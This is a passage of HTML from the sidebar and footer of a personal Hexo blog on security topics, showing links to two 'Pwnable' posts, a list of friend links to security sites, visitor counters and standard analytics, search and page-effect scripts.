class="post-list-item"><a class="post-list-link" href="/2018/12/08/Pwnable-2/">Pwnable（二）</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/07/Pwnable-1/">Pwnable（一）</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-external-link"> 友情链接</i></div><ul></ul><a href="http://www.t00ls.net/" title="T00ls" target="_blank">T00ls</a><ul></ul><a href="http://riusksk.me" title="riusksk" target="_blank">riusksk</a><ul></ul><a href="https://micropoor.blogspot.com" title="Micropoor" target="_blank">Micropoor</a><ul></ul><a href="http://www.cnblogs.com/backlion" title="Backlion" target="_blank">Backlion</a><ul></ul><a href="https://onebugman.com" title="OneBugMan" target="_blank">OneBugMan</a><ul></ul><a href="http://yama0xff.com" title="yama0xff.com" target="_blank">yama0xff.com</a><ul></ul><a href="https://github.com/maskhed/MyPapers" title="Papers" target="_blank">Papers</a><ul></ul><a href="https://musicforprogramming.net" title="musicforprogramming.net" target="_blank">musicforprogramming.net</a></div></div></div><div class="pure-u-1 pure-u-md-3-4"><div id="footer"><div>Total<span id="busuanzi_container_site_pv"><span> </span><span id="busuanzi_value_site_pv"></span></span><span rel="nofollow">  hits, </span><span id="busuanzi_container_site_uv"><span id="busuanzi_value_site_uv"></span></span><span rel="nofollow">  visitors. </span></div><div><script>var cnzz_protocol = (("https:" == document.location.protocol) ? " https://" : " http://");document.write(unescape("%3Cspan id='cnzz_stat_icon_1275288791'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "s23.cnzz.com/z_stat.php%3Fid%3D1275288791%26online%3D1%26show%3Dline' type='text/javascript'%3E%3C/script%3E"));</script></div>Copyright © 2019 <a href="/." rel="nofollow">Mr.Ma3k4H3d.</a> Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a><a rel="nofollow" target="_blank" href="https://github.com/tufu9441/maupassant-hexo"> Theme</a> by<a rel="nofollow" target="_blank" href="https://github.com/pagecho"> Cho.</a></div></div></div><a class="show" id="rocket" href="#top"></a><script type="text/javascript" src="/js/totop.js?v=0.0.0" async></script><script type="text/javascript" src="//cdn.bootcss.com/fancybox/3.3.5/jquery.fancybox.min.js" async></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.0" async></script><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/fancybox/3.3.5/jquery.fancybox.min.css"><script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script><script type="text/javascript" src="/js/search.js?v=0.0.0"></script><script>var search_path = 'search.xml';
if (search_path.length == 0) {
   search_path = 'search.xml';
}
var path = '/' + search_path;
searchFunc(path, 'local-search-input', 'local-search-result');
</script><script type="text/javascript" color="208,55,66" opacity="0.3" zIndex="-1" count="99" src="//cdn.bootcss.com/canvas-nest.js/1.0.1/canvas-nest.min.js"></script><script type="text/javascript" src="/js/codeblock-resizer.js?v=0.0.0"></script><script type="text/javascript" src="/js/smartresize.js?v=0.0.0"></script></div></body></html>